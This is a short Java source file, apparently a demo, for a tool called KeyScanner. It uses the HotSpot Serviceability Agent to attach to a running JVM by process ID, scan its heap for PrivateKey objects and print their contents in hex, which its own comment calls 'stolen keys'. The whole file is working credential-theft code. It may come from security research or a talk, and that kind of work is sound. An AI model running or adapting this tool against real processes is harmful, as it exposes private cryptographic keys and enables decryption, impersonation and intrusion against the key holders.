package demo5;

import sun.jvm.hotspot.memory.SystemDictionary;
import sun.jvm.hotspot.oops.DefaultHeapVisitor;
import sun.jvm.hotspot.oops.Klass;
import sun.jvm.hotspot.oops.Oop;
import sun.jvm.hotspot.runtime.VM;
import sun.jvm.hotspot.tools.Tool;

/**
 * Scans the heap of the target JVM to find the instances of PrivateKey.
 * Prints the contents of stolen keys in hex.
 * This tool is based on HotSpot Serviceability Agent.
 */
public class KeyScanner extends Tool {

    @Override
    public void run() {
        SystemDictionary dictionary = VM.getVM().getSystemDictionary();
        Klass klass = dictionary.find("java/security/PrivateKey", null, null);

        VM.getVM().getObjectHeap().iterateObjectsOfKlass(new DefaultHeapVisitor() {
            @Override
            public boolean doObj(Oop oop) {
                oop.iterate(new KeyPrinter(), false);
                return false;
            }
        }, klass);
    }

    public static void main(String[] args) {
        // Replace 10372 with the target Java process ID
        new KeyScanner().execute(new String[]{"10372"});
    }
}
